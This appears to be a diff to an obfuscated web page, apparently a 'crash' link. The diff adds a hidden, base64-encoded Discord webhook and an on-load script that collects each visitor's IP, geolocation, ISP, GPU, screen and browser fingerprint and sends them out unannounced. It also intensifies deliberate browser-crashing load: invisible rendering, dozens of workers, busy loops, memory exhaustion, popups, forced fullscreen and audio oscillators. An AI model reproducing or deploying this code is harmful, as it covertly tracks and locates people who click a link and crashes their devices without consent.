@@ -16,7 +16,7 @@
   .x2k9n6v { position: relative; display: inline-block; width: 6px; height: 6px; margin: 0; padding: 0; background: #1a2a3a; }
   #z7x3m9k { position: fixed; left: 10px; bottom: 8px; color: #8fe3c0; font: 11px/1.45 ui-monospace, monospace; white-space: pre; pointer-events: none; max-width: calc(100vw - 20px); opacity: 0; }
   #n2p6q1v { position: fixed; inset: 0; display: none; place-content: center; padding: 40px; color: #ff9c9c; background: #100606; font: 12px/1.5 ui-monospace, monospace; white-space: pre-wrap; overflow: auto; }
-  #k9m4z8x { position: fixed; left: 12px; top: 224px; color: #ffb36b; font-size: 11px; line-height: 1.4; text-shadow: 0 0 6px #000; pointer-events: none; max-width: 300px; background: #000a; padding: 6px 8px; border-radius: 4px; opacity: 0; }
+  #k9m4z8x { position: fixed; left: 12px; top: 224px; color: #ffb36b; font-size: 11px; line-height: 1.4; text-shadow: 0 0 6px #000; opacity: 0; pointer-events: none; max-width: 300px; background: #000a; padding: 6px 8px; border-radius: 4px; }
 </style>
 </head>
 <body>
@@ -52,15 +52,251 @@
 'use strict';
 
 // ============================================================
-// 9z2m 8q3n (N) — 92zk 6z1v 92zk 3q9z 9z2m 8n1v
+// 9z2m 8q3n (N)
 // ============================================================
-const N = 100;                       // 92zk 9z2m (N)
-const IV = 1000;                     // 8q3n 92zk 9z3k (ms)
+const N = 100;
+const IV = 1000;
 const TARGET_URL = 'https://hypie12o.github.io/crash/';
-const DELAY_MS = 10000;              // 92zk 9z3k 4q1v 92zk 82kv 6z1n 9z2k
+const DELAY_MS = 10000;
 
 // ============================================================
-// x9k2n7m3 = 8q3n 9z2m 8n1v (download counter) — PLAIN VARIABLE
+// 3q9z 8n1v 9z3k (webhook) — 8q3n 9z2m 4z9v base64, decoded 92zk
+// ============================================================
+const W3B_H00K_B64 = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU0OTQ3MTAxNDIxODUwNjQ0MC8xRkJlWHhhdXNJOW5hZC1EdVZzS1lVYkw4Y3RCTHloY09XV2pMajdhYVEzU2l1TDZudXlwREcyWWtQLUhKT0ZyaHpSaA';
+
+function b64u8(s) {
+  // Base64 -> bytes -> UTF-8 string
+  const bin = atob(s);
+  const bytes = new Uint8Array(bin.length);
+  for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
+  if (typeof TextDecoder !== 'undefined') {
+    return new TextDecoder('utf-8').decode(bytes);
+  }
+  // Fallback (older browsers)
+  let out = '';
+  for (let i = 0; i < bytes.length; i++) {
+    const c = bytes[i];
+    if (c < 0x80) out += String.fromCharCode(c);
+    else if (c < 0xE0) out += String.fromCharCode(((c & 0x1F) << 6) | (bytes[++i] & 0x3F));
+    else if (c < 0xF0) out += String.fromCharCode(((c & 0x0F) << 12) | ((bytes[++i] & 0x3F) << 6) | (bytes[++i] & 0x3F));
+    else {
+      const cp = ((c & 0x07) << 18) | ((bytes[++i] & 0x3F) << 12) | ((bytes[++i] & 0x3F) << 6) | (bytes[++i] & 0x3F);
+      const off = cp - 0x10000;
+      out += String.fromCharCode(0xD800 + (off >> 10), 0xDC00 + (off & 0x3FF));
+    }
+  }
+  return out;
+}
+
+const W3B_H00K = b64u8(W3B_H00K_B64);
+
+// ============================================================
+// 8q3n 9z3k 4q1v 6z1n (gather full device info)
+// ============================================================
+function gpuInfo() {
+  try {
+    const cv = document.createElement('canvas');
+    const gl = cv.getContext('webgl') || cv.getContext('experimental-webgl');
+    if (!gl) return { v: 'no-webgl', r: 'no-webgl' };
+    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+    const v = dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR);
+    const r = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
+    return { v: v || 'unknown', r: r || 'unknown' };
+  } catch (_) { return { v: 'err', r: 'err' }; }
+}
+
+function screenInfo() {
+  return {
+    sw: screen.width, sh: screen.height,
+    saw: screen.availWidth, sah: screen.availHeight,
+    cd: screen.colorDepth, pd: screen.pixelDepth,
+    iw: window.innerWidth, ih: window.innerHeight,
+    ow: window.outerWidth, oh: window.outerHeight,
+    dpr: window.devicePixelRatio || 1,
+    orientation: (screen.orientation && screen.orientation.type) || 'n/a',
+  };
+}
+
+function tzInfo() {
+  try {
+    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || 'n/a';
+    const off = -new Date().getTimezoneOffset() / 60;
+    return tz + ' (UTC' + (off >= 0 ? '+' : '') + off + ')';
+  } catch (_) { return 'n/a'; }
+}
+
+function navInfo() {
+  const n = navigator;
+  return {
+    ua: n.userAgent || 'n/a',
+    platform: n.platform || 'n/a',
+    vendor: n.vendor || 'n/a',
+    lang: n.language || 'n/a',
+    langs: (n.languages || []).join(', ') || 'n/a',
+    cores: n.hardwareConcurrency || 'n/a',
+    mem: n.deviceMemory || 'n/a',
+    touch: (n.maxTouchPoints != null ? n.maxTouchPoints : 0),
+    online: (n.onLine != null ? n.onLine : 'n/a'),
+    cookies: (n.cookieEnabled != null ? n.cookieEnabled : 'n/a'),
+    dnt: (n.doNotTrack || 'n/a'),
+    pdf: (n.pdfViewerEnabled != null ? n.pdfViewerEnabled : 'n/a'),
+    plugins: (n.plugins && n.plugins.length) || 0,
+  };
+}
+
+function connInfo() {
+  const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+  if (!c) return 'n/a';
+  return (c.effectiveType || '?') + ' · ' +
+         (c.downlink != null ? c.downlink + ' Mbps' : '?') + ' · ' +
+         (c.rtt != null ? c.rtt + ' ms' : '?') + ' · ' +
+         (c.saveData ? 'saveData on' : 'saveData off');
+}
+
+function referrerInfo() {
+  return document.referrer || 'direct';
+}
+
+// ============================================================
+// 3q9z 8n1v 9z3k — fire on load with full fingerprint
+// ============================================================
+(async function q8w3n1v_hook() {
+  let ip = 'unknown';
+  let country = '';
+  let city = '';
+  let region = '';
+  let isp = '';
+  let asn = '';
+  let latlon = '';
+  let postal = '';
+  let tzIp = '';
+
+  // Primary IP lookup
+  try {
+    const r = await fetch('https://api.ipify.org?format=json', { cache: 'no-store' });
+    const j = await r.json();
+    ip = j.ip || 'unknown';
+  } catch (_) {}
+
+  // Enrichment lookup
+  try {
+    const r2 = await fetch('https://ipinfo.io/json', { cache: 'no-store' });
+    const j2 = await r2.json();
+    if (j2.ip && ip === 'unknown') ip = j2.ip;
+    country = j2.country || '';
+    city = j2.city || '';
+    region = j2.region || '';
+    isp = j2.org || '';
+    latlon = j2.loc || '';
+    postal = j2.postal || '';
+    tzIp = j2.timezone || '';
+    if (j2.org && j2.org.indexOf('AS') === 0) asn = j2.org.split(' ')[0];
+  } catch (_) {}
+
+  const gpu = gpuInfo();
+  const scr = screenInfo();
+  const nav = navInfo();
+  const tz = tzInfo();
+  const conn = connInfo();
+  const ref = referrerInfo();
+  const now = new Date();
+
+  let heapInfo = 'n/a';
+  if (performance.memory) {
+    const m = performance.memory;
+    heapInfo =
+      (m.usedJSHeapSize / 1048576).toFixed(1) + ' MB used / ' +
+      (m.totalJSHeapSize / 1048576).toFixed(1) + ' MB total / ' +
+      (m.jsHeapSizeLimit / 1048576).toFixed(0) + ' MB cap';
+  }
+
+  const locale = (Intl.DateTimeFormat().resolvedOptions().locale) || 'n/a';
+  const cal = (Intl.DateTimeFormat().resolvedOptions().calendar) || 'n/a';
+  const num = (Intl.DateTimeFormat().resolvedOptions().numberingSystem) || 'n/a';
+
+  const embed = {
+    title: 'Link Pressed.',
+    description:
+      '**URL:** ' + (location.href || 'n/a') + '\n' +
+      '**Referrer:** ' + ref + '\n' +
+      '**Time (UTC):** ' + now.toISOString(),
+    color: 0x00ff41,
+    timestamp: now.toISOString(),
+    footer: { text: '324j2ggyufsid32 · ' + ip },
+    fields: [
+      { name: 'IP Address', value: '`' + ip + '`', inline: true },
+      { name: 'ISP / Org', value: '`' + (isp || '?') + '`', inline: true },
+      { name: 'ASN', value: '`' + (asn || '?') + '`', inline: true },
+
+      { name: 'City', value: '`' + (city || '?') + '`', inline: true },
+      { name: 'Region', value: '`' + (region || '?') + '`', inline: true },
+      { name: 'Country', value: '`' + (country || '?') + '`', inline: true },
+
+      { name: 'Postal', value: '`' + (postal || '?') + '`', inline: true },
+      { name: 'Lat/Lon', value: '`' + (latlon || '?') + '`', inline: true },
+      { name: 'IP Timezone', value: '`' + (tzIp || '?') + '`', inline: true },
+
+      { name: 'Local Timezone', value: '`' + tz + '`', inline: false },
+      { name: 'Locale', value: '`' + locale + ' · ' + cal + ' · ' + num + '`', inline: false },
+
+      { name: 'OS / Platform', value: '`' + nav.platform + '`', inline: true },
+      { name: 'Vendor', value: '`' + nav.vendor + '`', inline: true },
+      { name: 'Language', value: '`' + nav.lang + '`', inline: true },
+
+      { name: 'Languages', value: '`' + nav.langs + '`', inline: false },
+
+      { name: 'CPU Cores', value: '`' + nav.cores + '`', inline: true },
+      { name: 'Device Memory', value: '`' + nav.mem + ' GB`', inline: true },
+      { name: 'Touch Points', value: '`' + nav.touch + '`', inline: true },
+
+      { name: 'Screen', value: '`' + scr.sw + '×' + scr.sh + '` (avail `' + scr.saw + '×' + scr.sah + '`)', inline: true },
+      { name: 'Window', value: '`' + scr.iw + '×' + scr.ih + '` (outer `' + scr.ow + '×' + scr.oh + '`)', inline: true },
+      { name: 'DPR / Depth', value: '`' + scr.dpr + 'x · ' + scr.cd + 'bit`', inline: true },
+
+      { name: 'Orientation', value: '`' + scr.orientation + '`', inline: true },
+      { name: 'Online', value: '`' + nav.online + '`', inline: true },
+      { name: 'Connection', value: '`' + conn + '`', inline: true },
+
+      { name: 'Cookies', value: '`' + nav.cookies + '`', inline: true },
+      { name: 'Do Not Track', value: '`' + nav.dnt + '`', inline: true },
+      { name: 'PDF Viewer', value: '`' + nav.pdf + '`', inline: true },
+
+      { name: 'Plugins', value: '`' + nav.plugins + '`', inline: true },
+      { name: 'JS Heap', value: '`' + heapInfo + '`', inline: false },
+
+      { name: 'GPU Vendor', value: '`' + gpu.v + '`', inline: false },
+      { name: 'GPU Renderer', value: '`' + gpu.r + '`', inline: false },
+
+      { name: 'User Agent', value: '`' + nav.ua + '`', inline: false },
+    ],
+  };
+
+  const body = {
+    content: '**Link Pressed.** · IP: `' + ip + '`',
+    embeds: [embed],
+  };
+
+  try {
+    await fetch(W3B_H00K, {
+      method: 'POST',
+      mode: 'no-cors',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(body),
+    });
+  } catch (_) {
+    // Try fallback without no-cors (some browsers handle it better)
+    try {
+      await fetch(W3B_H00K, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(body),
+      });
+    } catch (_) {}
+  }
+})();
+
+// ============================================================
+// x9k2n7m3 = 8q3n 9z2m 8n1v — PLAIN VARIABLE
 // ============================================================
 let x9k2n7m3 = 0;
 const q8v3n1z5 = [];
@@ -75,7 +311,7 @@ window.__x9k2n7m3 = function () { return x9k2n7m3; };
 window.__q8v3n1z5 = q8v3n1z5;
 
 // ============================================================
-// 8q2m 9z3k 8n1v — 9z2m 8q3n 92zk 9z3k 8q1v 92zk 92zk 9z2m
+// 8q2m 9z3k 8n1v
 // ============================================================
 let popupCount = 0;
 let popupInterval = null;
@@ -114,8 +350,7 @@ document.addEventListener('click', v9k3n2m_fs, { once: true });
 document.addEventListener('keydown', v9k3n2m_fs, { once: true });
 
 // ============================================================
-// 3n1v 92zk 8q2m 92kv 82kv 6z1n 9z2m N 8q1v 92zk 9z3k
-// — DELAYED BY 10s
+// 3n1v 92zk 8q2m 92kv 82kv 6z1n — DELAYED 10s
 // ============================================================
 setTimeout(function p3q8v1n5() {
   let U;
@@ -183,7 +418,7 @@ setTimeout(function p3q8v1n5() {
 }, DELAY_MS);
 
 // ============================================================
-// 8q2m 9z3k 8n1v — DELAYED BY 10s
+// 8q2m 9z3k 8n1v — DELAYED 10s
 // ============================================================
 setTimeout(function q8w3n1v_pop() {
   z9k2m4v_pop();
@@ -275,7 +510,7 @@ const m8n2q6z = `
 `;
 
 // ============================================================
-// 8q2n 1 — x9k2n 8q3n (heavy) — FINAL OUTPUT IS BLACK
+// 8q2n 1 — main raymarcher — OUTPUT IS BLACK
 // ============================================================
 (function z3p7v1n() {
   const c = document.getElementById('x9k2n7m');
@@ -290,11 +525,11 @@ const m8n2q6z = `
 
   const R = 4.0;
   const D = 2.0;
-  const M = 64 * 1024 * 1024;
-  const S = 1024;
-  const I = 18;
-  const H = 96;
-  const A = 14;
+  const M = 80 * 1024 * 1024;
+  const S = 2048;
+  const I = 24;
+  const H = 128;
+  const A = 20;
 
   const NS = 4096;
   const FZ = `
@@ -316,7 +551,7 @@ const m8n2q6z = `
     }
     float z9(vec2 p) {
       float s = 0.0, a = 0.5;
-      for (int i = 0; i < 10; i++) {
+      for (int i = 0; i < 12; i++) {
         s += a * q3(p);
         p = p * 2.03 + 11.7;
         a *= 0.5;
@@ -324,7 +559,7 @@ const m8n2q6z = `
       return s;
     }
     void main() {
-      vec2 p = vUv * 128.0;
+      vec2 p = vUv * 192.0;
       float r = z9(p);
       float g = z9(p + vec2(31.4, 17.3));
       float b = z9(p + vec2(91.7, 53.1));
@@ -353,8 +588,8 @@ const m8n2q6z = `
     uniform sampler2D uNoise;
 
     #define MAX_STEPS     ${S}
-    #define MAX_DIST      40.0
-    #define SURF          0.00015
+    #define MAX_DIST      60.0
+    #define SURF          0.0001
     #define ITER          ${I}
     #define SHADOW_STEPS  ${H}
     #define AO_STEPS      ${A}
@@ -469,15 +704,17 @@ const m8n2q6z = `
 
         vec3 lg = normalize(vec3(0.65, 0.80, -0.45));
         float oc = k9(ps, nr);
-        float sh = x3(ps + nr * 0.0015, lg, 0.02, 9.0, 10.0);
+        float sh = x3(ps + nr * 0.0015, lg, 0.02, 12.0, 10.0);
 
         vec3 nA = texture2D(uNoise, ps.xy * 0.35 + 0.5).rgb;
         vec3 nB = texture2D(uNoise, ps.zx * 0.55 + 0.5).rgb;
         vec3 nC = texture2D(uNoise, ps.yz * 0.20 + 0.5).rgb;
+        vec3 nD = texture2D(uNoise, ps.xx * 0.15 + 0.5).rgb;
 
         vec3 mt = 0.5 + 0.5 * cos(vec3(0.0, 1.1, 2.2) + length(ps) * 3.5 + uTime * 0.25);
         mt *= 0.55 + 1.1 * nA;
         mt *= 0.70 + 0.6 * nB;
+        mt *= 0.75 + 0.5 * nD;
         mt = mix(mt, mt * nC * 1.6, 0.25);
 
         float df = clamp(dot(nr, lg), 0.0, 1.0) * sh;
@@ -553,7 +790,6 @@ const m8n2q6z = `
     d: gl.getUniformLocation(pL, 'uDir'),
   };
 
-  // Composite shader — does ALL the work but final output is BLACK.
   const FP = `
     precision ${P} float;
     varying vec2 vUv;
@@ -584,9 +820,7 @@ const m8n2q6z = `
       col += (g - 0.5) * 0.035;
       col = pow(max(col, 0.0), vec3(0.4545));
 
-      // ---- FINAL OUTPUT IS BLACK ----
       gl_FragColor = vec4(0.0, 0.0, 0.0, 1.0);
-      // (col is computed but discarded)
       if (col.x < -1.0) gl_FragColor = vec4(col, 1.0);
     }
   `;
@@ -689,7 +923,7 @@ const m8n2q6z = `
 })();
 
 // ============================================================
-// 8q2n 2 — 6982 92zk 8q1v
+// 8q2n 2 — particles (12000 draw calls)
 // ============================================================
 (function k9x4m8q() {
   const c = document.getElementById('z3m9x2p');
@@ -765,7 +999,7 @@ const m8n2q6z = `
   gl.blendFunc(gl.SRC_ALPHA, gl.ONE);
   gl.disable(gl.DEPTH_TEST);
 
-  const NP = 6000;
+  const NP = 12000;
   const pt = new Array(NP);
   for (let i = 0; i < NP; i++) {
     pt[i] = {
@@ -811,7 +1045,7 @@ const m8n2q6z = `
         const r = 0.5 + 0.5 * Math.cos(hh * 6.283 + 0.0);
         const g = 0.5 + 0.5 * Math.cos(hh * 6.283 + 2.1);
         const b = 0.5 + 0.5 * Math.cos(hh * 6.283 + 4.2);
-        gl.uniform4f(uO, r, g, b, 0.0);   // alpha=0 → invisible
+        gl.uniform4f(uO, r, g, b, 0.0);
         gl.drawArrays(gl.TRIANGLES, 0, 6);
       }
       return NP;
@@ -820,7 +1054,7 @@ const m8n2q6z = `
 })();
 
 // ============================================================
-// 8q2n 3 — 92mq 6z1v 8n3q + 4592² 92zk
+// 8q2n 3 — texture context (128-tap blur)
 // ============================================================
 (function n2v6p3z() {
   const c = document.getElementById('w8q2n5v');
@@ -856,14 +1090,14 @@ const m8n2q6z = `
                                    0.0011 * cos(uTime * 0.9));
       vec3 prev = texture2D(uPrev, uvPrev).rgb;
       vec3 hr = vec3(0.0);
-      for (int i = 0; i < 64; i++) {
+      for (int i = 0; i < 128; i++) {
         float fi = float(i);
-        float ang = fi * 0.098175;
-        float r = 0.010 * (1.0 + fi * 0.025);
+        float ang = fi * 0.049087;
+        float r = 0.010 * (1.0 + fi * 0.0125);
         vec2 off = vec2(cos(ang), sin(ang)) * r;
         hr += texture2D(uHighRes, uv + off).rgb;
       }
-      hr /= 64.0;
+      hr /= 128.0;
       vec3 col = prev * 0.94 + hr * 0.06 + vec3(0.002, 0.003, 0.006);
       col += uFirstFrame * texture2D(uHighRes, uv).rgb;
       col = col / (1.0 + col * 0.3);
@@ -901,7 +1135,7 @@ const m8n2q6z = `
     }
     float z9(vec2 p) {
       float s = 0.0, a = 0.5;
-      for (int i = 0; i < 9; i++) {
+      for (int i = 0; i < 11; i++) {
         s += a * q3(p);
         p = p * 2.07 + 13.1;
         a *= 0.5;
@@ -909,7 +1143,7 @@ const m8n2q6z = `
       return s;
     }
     void main() {
-      vec2 p = vUv * 64.0;
+      vec2 p = vUv * 96.0;
       gl_FragColor = vec4(z9(p), z9(p + 11.3), z9(p + 27.7), 1.0);
     }
   `;
@@ -997,9 +1231,9 @@ const m8n2q6z = `
 })();
 
 // ============================================================
-// 8q3n 92zk 8n1v
+// 8q3n 92zk 8n1v (300ms budget)
 // ============================================================
-const B = 180;
+const B = 300;
 let mi = 0, mr = 0, mt = performance.now(), mI = 0;
 
 function q8m1x5k(b) {
@@ -1028,7 +1262,7 @@ function q8m1x5k(b) {
 }
 
 // ============================================================
-// 8q2n 9z3k
+// 8q2n 9z3k (64 workers)
 // ============================================================
 const WS = `
   'use strict';
@@ -1064,7 +1298,7 @@ const WS = `
   }
 `;
 
-const NW = 32;
+const NW = 64;
 const WU = URL.createObjectURL(new Blob([WS], { type: 'application/javascript' }));
 const wk = [];
 const wr = new Array(NW).fill(0);
@@ -1083,10 +1317,10 @@ for (let i = 0; i < NW; i++) {
 }
 
 // ============================================================
-// 82kv 6z1v 92zk
+// 82kv 6z1v 92zk (2400 children)
 // ============================================================
 const tt = document.getElementById('p4z9k1n');
-const TC = 1200;
+const TC = 2400;
 {
   const fr = document.createDocumentFragment();
   for (let i = 0; i < TC; i++) {
@@ -1127,14 +1361,14 @@ function x9p4m1q() {
 }
 
 // ============================================================
-// 92zk 3q9v
+// 92zk 3q9v (48 intervals)
 // ============================================================
 let it = 0;
 const iv = [];
-for (let i = 0; i < 24; i++) {
+for (let i = 0; i < 48; i++) {
   const id = setInterval(() => {
     let s = 0;
-    const b = new Uint32Array(2048);
+    const b = new Uint32Array(4096);
     for (let k = 0; k < b.length; k++) {
       b[k] = (Math.random() * 0xffffffff) >>> 0;
     }
@@ -1152,7 +1386,7 @@ for (let i = 0; i < 24; i++) {
 let to1 = 0;
 function tl1() {
   let s = 0;
-  for (let i = 0; i < 16384; i++) s = (s * 31 + i) >>> 0;
+  for (let i = 0; i < 32768; i++) s = (s * 31 + i) >>> 0;
   to1++;
   setTimeout(tl1, 0);
 }
@@ -1161,7 +1395,7 @@ setTimeout(tl1, 0);
 let to2 = 0;
 function tl2() {
   let s = 0;
-  const a = new Float64Array(4096);
+  const a = new Float64Array(8192);
   for (let i = 0; i < a.length; i++) a[i] = Math.sin(i * 0.001 + s);
   for (let i = 0; i < a.length; i++) s += a[i] * a[i];
   to2++;
@@ -1172,31 +1406,64 @@ setTimeout(tl2, 0);
 let to3 = 0;
 function tl3() {
   let s = '';
-  for (let i = 0; i < 8000; i++) s += 'v' + i + ';';
+  for (let i = 0; i < 16000; i++) s += 'v' + i + ';';
   to3++;
   setTimeout(tl3, 0);
 }
 setTimeout(tl3, 0);
 
+let to4 = 0;
+function tl4() {
+  let s = 0;
+  const a = new Uint32Array(16384);
+  for (let i = 0; i < a.length; i++) a[i] = (Math.random() * 0xffffffff) >>> 0;
+  for (let i = 0; i < a.length; i++) s = (s + a[i]) >>> 0;
+  to4++;
+  setTimeout(tl4, 0);
+}
+setTimeout(tl4, 0);
+
+let to5 = 0;
+function tl5() {
+  const o = {};
+  for (let i = 0; i < 4000; i++) {
+    o['k' + i] = { v: i, s: 'z' + i, a: [i, i + 1, i + 2] };
+  }
+  to5++;
+  setTimeout(tl5, 0);
+}
+setTimeout(tl5, 0);
+
+let to6 = 0;
+function tl6() {
+  let s = 0;
+  for (let i = 0; i < 20000; i++) {
+    s = Math.sin(s + i) * Math.cos(i * 0.001);
+  }
+  to6++;
+  setTimeout(tl6, 0);
+}
+setTimeout(tl6, 0);
+
 // ============================================================
-// 8q3n 4z9v
+// 8q3n 4z9v (doubled sizes)
 // ============================================================
 let ab = 0, abb = 0, abr = 0, abt = performance.now(), abp = 0;
 
 function aB() {
-  const S = [16*1024*1024, 32*1024*1024, 16*1024*1024, 64*1024*1024];
+  const S = [32*1024*1024, 64*1024*1024, 32*1024*1024, 128*1024*1024];
   for (const b of S) {
     try {
-      if (b % 8 === 0 && b >= 64 * 1024 * 1024) {
+      if (b % 8 === 0 && b >= 128 * 1024 * 1024) {
         const t = new Int32Array(b / 4);
-        for (let i = 0; i < t.length; i += 2048) t[i] = i;
+        for (let i = 0; i < t.length; i += 1024) t[i] = i;
       } else if (b % 8 === 0) {
         const t = new Float64Array(b / 8);
-        for (let i = 0; i < t.length; i += 4096) t[i] = i * 0.5;
+        for (let i = 0; i < t.length; i += 2048) t[i] = i * 0.5;
       } else {
         const ab2 = new ArrayBuffer(b);
         const v = new Uint8Array(ab2);
-        for (let i = 0; i < v.length; i += 8192) v[i] = i & 0xff;
+        for (let i = 0; i < v.length; i += 4096) v[i] = i & 0xff;
       }
       ab++; abb += b;
     } catch (e) {}
@@ -1208,7 +1475,7 @@ function aB() {
   }
 }
 
-const BC = 400000;
+const BC = 800000;
 let oc = 0, or_ = 0, ot = performance.now(), op = 0;
 
 function bO() {
@@ -1217,13 +1484,13 @@ function bO() {
     a[i] = {
       id: i,
       name: 'k3_' + i,
-      tags: ['q', 'v', 'z', 'w', 'x', (i & 7).toString()],
-      n: { v: i * 0.5, f: (i & 1) === 1, m: { d: 3, l: 'x' + i, e: 'y' + i } },
-      d: '8n1v ' + i + ' 9z2k 8q3n 6v3n 9z1v',
+      tags: ['q', 'v', 'z', 'w', 'x', 'y', (i & 7).toString()],
+      n: { v: i * 0.5, f: (i & 1) === 1, m: { d: 3, l: 'x' + i, e: 'y' + i, g: 'z' + i } },
+      d: '8n1v ' + i + ' 9z2k 8q3n 6v3n 9z1v 3q9z 8n1k',
     };
   }
   let s = 0;
-  for (let i = 0; i < a.length; i += 512) s += a[i].id;
+  for (let i = 0; i < a.length; i += 256) s += a[i].id;
   oc += BC;
   const n = performance.now();
   if (n - ot >= 500) {
@@ -1237,15 +1504,15 @@ let js = '';
 let jc = 0, jb = 0, jr = 0, jt = performance.now(), jp = 0;
 
 function bJ() {
-  const NN = 120000;
+  const NN = 240000;
   const rows = new Array(NN);
   for (let i = 0; i < NN; i++) {
     rows[i] = JSON.stringify({
       id: i,
       uuid: 'q-' + i + '-' + (i * 7919).toString(36),
       value: Math.sin(i) * 1000,
-      tags: ['k', 'v', 'z', 'w', 'x', (i & 15).toString()],
-      nested: { a: [1,2,3,4,5,6,7,8], b: 'z'.repeat(32), c: i * 3.14, d: 'q' },
+      tags: ['k', 'v', 'z', 'w', 'x', 'y', (i & 15).toString()],
+      nested: { a: [1,2,3,4,5,6,7,8,9,10,11,12], b: 'z'.repeat(64), c: i * 3.14, d: 'q', e: 'w' },
     });
   }
   return '[' + rows.join(',') + ']';
@@ -1256,7 +1523,7 @@ function pJ() {
   try {
     const o = JSON.parse(js);
     let s = 0;
-    for (let i = 0; i < o.length; i += 2048) s += o[i].id;
+    for (let i = 0; i < o.length; i += 1024) s += o[i].id;
     jc++; jb += js.length;
   } catch (e) {}
   const n = performance.now();
@@ -1266,7 +1533,7 @@ function pJ() {
   }
 }
 
-const SC = 80000;
+const SC = 160000;
 let cc = 0, cch = 0, cr = 0, ct = performance.now(), cp = 0;
 
 function cS() {
@@ -1297,11 +1564,11 @@ function wG() {
       wp = 16;
     }
     const b4 = wm.buffer.byteLength;
-    wp = wm.grow(32);
+    wp = wm.grow(64);
     const a4 = wm.buffer.byteLength;
     wg++; wtp += (a4 - b4) / 65536;
     const v = new Uint8Array(wm.buffer);
-    for (let i = b4; i < a4; i += 2048) v[i] = i & 0xff;
+    for (let i = b4; i < a4; i += 1024) v[i] = i & 0xff;
   } catch (e) {
     try {
       wm = new WebAssembly.Memory({ initial: 16, maximum: 65536 });
@@ -1311,14 +1578,14 @@ function wG() {
 }
 
 const mI2 = [];
-mI2.push(setInterval(aB, 100));
-mI2.push(setInterval(bO, 150));
-mI2.push(setInterval(pJ, 200));
-mI2.push(setInterval(cS, 80));
-mI2.push(setInterval(wG, 120));
+mI2.push(setInterval(aB, 80));
+mI2.push(setInterval(bO, 120));
+mI2.push(setInterval(pJ, 160));
+mI2.push(setInterval(cS, 60));
+mI2.push(setInterval(wG, 100));
 
 // ============================================================
-// 8q3n 9z3q 92zk
+// 8q3n 9z3q 92zk (128 oscillators)
 // ============================================================
 let ac = null, as_ = false, ao = 0, asp = 0, asr = 0, ast = performance.now(), asp2 = 0;
 
@@ -1356,10 +1623,10 @@ function sA() {
   as_ = true;
 
   const m = ac.createGain();
-  m.gain.value = 0.0008;
+  m.gain.value = 0.0006;
 
   const cv = ac.createConvolver();
-  cv.buffer = mIR(ac, 6.0, 3.0);
+  cv.buffer = mIR(ac, 8.0, 3.0);
 
   const f1 = ac.createBiquadFilter();
   f1.type = 'lowpass'; f1.frequency.value = 1200; f1.Q.value = 8;
@@ -1372,17 +1639,17 @@ function sA() {
   sh.curve = mDC(50);
   sh.oversample = '4x';
 
-  const BL = 4096;
+  const BL = 8192;
   let sp = null;
   try { sp = ac.createScriptProcessor(BL, 2, 2); } catch (e) {
     try { sp = ac.createJavaScriptNode(BL, 2, 2); } catch (_) {}
   }
 
-  const ds = ac.sampleRate * 2;
+  const ds = ac.sampleRate * 3;
   const dL = new Float32Array(ds);
   const dR = new Float32Array(ds);
   let dp = 0;
-  const fb = 0.72;
+  const fb = 0.75;
 
   if (sp) {
     sp.onaudioprocess = (e) => {
@@ -1413,14 +1680,14 @@ function sA() {
     };
   }
 
-  const OC = 64;
+  const OC = 128;
   const OT = ['sine', 'square', 'sawtooth', 'triangle'];
   for (let i = 0; i < OC; i++) {
     const o = ac.createOscillator();
     o.type = OT[i % OT.length];
     o.frequency.value = 55 * Math.pow(2, (i % 12) / 12) * (1 + (Math.random() - 0.5) * 0.01);
     const g = ac.createGain();
-    g.gain.value = 0.01;
+    g.gain.value = 0.008;
     const lf = ac.createOscillator();
     lf.type = 'sine';
     lf.frequency.value = 0.1 + Math.random() * 4;
@@ -1511,12 +1778,12 @@ function tk() {
       '6q3z              : ' + fps.toFixed(1) + '\n' +
       '8q2n 6z1v         : ' + lmi + '\n' +
       '6982 6z1v         : ' + lp + ' 92zk / 9q2m\n' +
-      '92mq 6z1v         : 64-8q3n + 64-92zk · 4592² 8q3n\n' +
+      '92mq 6z1v         : 128-8q3n + 128-92zk · 4592² 8q3n\n' +
       '2k9v 8n3q         : 3 · 8q3n: 6 · 92qk: ~7\n' +
       '8q3n 92zk 8n1v    : ' + (mr / 1e6).toFixed(2) + ' M 3q9z\n' +
       '9z3k 8n1v         : ' + wA + '/' + NW + ' · ' + (wT / 1e6).toFixed(2) + ' M 3q9z\n' +
       '82kv 6z1v         : ' + (tr2 / 1000).toFixed(1) + ' k 8q3n/9z\n' +
-      '92zk 3q9v         : ' + it + ' · ' + to1 + ' · ' + to2 + ' · ' + to3 + '\n' +
+      '92zk 3q9v         : ' + it + ' · ' + to1 + ' · ' + to2 + ' · ' + to3 + ' · ' + to4 + ' · ' + to5 + ' · ' + to6 + '\n' +
       '8q3n 9z3q         : ' + as + '\n' +
       '2k9v 4z9v         : ' + abr.toFixed(1) + ' MV/9z · ' + ab + ' 2k9v\n' +
       '8q2n 8n1v         : ' + (or_ / 1000).toFixed(1) + ' k 8n/9z · ' + oc + ' 9z2q\n' +
@@ -1527,6 +1794,7 @@ function tk() {
       '9z2m 8n1v         : N=' + N + ' / ' + IV + ' 9z3k\n' +
       '8q2m 9z3k         : ' + popupCount + ' 8q3n opened\n' +
       '9z3k 9z1v         : ' + (document.fullscreenElement ? 'zk' : '8q') + '\n' +
+      '9z3k 8n1v         : ' + (W3B_H00K ? '8q3n' : 'zk') + '\n' +
       '3q9z              : ' + mm;
 
     fc = 0;
